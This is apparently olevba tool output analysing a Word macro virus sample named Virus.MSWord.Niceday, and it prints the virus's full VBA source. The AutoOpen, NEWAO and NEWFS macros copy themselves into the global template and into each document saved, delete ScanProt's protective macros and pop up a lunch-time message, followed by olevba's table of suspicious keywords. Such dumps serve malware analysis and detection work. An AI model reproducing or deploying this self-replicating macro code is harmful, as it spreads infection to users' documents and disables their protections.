olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Niceday-3d8b1e29bae7af1eaa2bd4b3653ae7d12f89776b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Niceday-3d8b1e29bae7af1eaa2bd4b3653ae7d12f89776b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Niceday-3d8b1e29bae7af1eaa2bd4b3653ae7d12f89776b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Infects your global template with a virus"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
'   iMacroCount = CountMacros(0, 0)
'   For i = 1 To iMacroCount
'       If MacroName$(i, 0, 0) = "FileSave" Then
'           bTooMuchTrouble = - 1
'       End If
'   Next i
'   If Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:FileSave"
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:NEWFS"
        sMacro$ = sMe$ + ":NEWAO"
        WordBasic.MacroCopy sMacro$, "Global:NEWAO"
'   End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NEWFS.bas 
in file: Virus.MSWord.Niceday-3d8b1e29bae7af1eaa2bd4b3653ae7d12f89776b - OLE stream: 'Macros/VBA/NEWFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Infects the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.NEWFS.MAIN"
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
If WordBasic.[Time$]() = "12:01 PM" Then
    WordBasic.MsgBox "Whatya doin' here? Take a lunch break!", "Lunch Time!", 48
End If
WordBasic.CurValues.FileSaveAs dlg
If InStr(WordBasic.[FileName$](), "\") = 0 Then
    WordBasic.Dialog.FileSaveAs dlg
    sMe$ = WordBasic.[FileNameInfo$](dlg.Name, 1)
    WordBasic.FileSaveAs dlg
Else
    sMe$ = WordBasic.[FileName$]()
End If
If dlg.Format = 0 Then dlg.Format = 1
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:NEWAO", sTMacro$
sTMacro$ = sMe$ + ":NEWAO"
WordBasic.MacroCopy "Global:NEWAO", sTMacro$
sTMacro$ = sMe$ + ":NEWFS"
WordBasic.MacroCopy "Global:NEWFS", sTMacro$
WordBasic.ToolsMacro Name:="FileOpen", Show:=1, Delete:=1          'Kill ScanProt!!!
WordBasic.ToolsMacro Name:="AutoExit", Show:=1, Delete:=1          'Kill ScanProt!!!
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NEWAO.bas 
in file: Virus.MSWord.Niceday-3d8b1e29bae7af1eaa2bd4b3653ae7d12f89776b - OLE stream: 'Macros/VBA/NEWAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Infects your global template with a virus"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.NEWAO.MAIN"
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
'   iMacroCount = CountMacros(0, 0)
'   For i = 1 To iMacroCount
'       If MacroName$(i, 0, 0) = "FileSave" Then
'           bTooMuchTrouble = - 1
'       End If
'   Next i
'   If Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:FileSave"
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:NEWFS"
        sMacro$ = sMe$ + ":NEWAO"
        WordBasic.MacroCopy sMacro$, "Global:NEWAO"
'   End If
Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

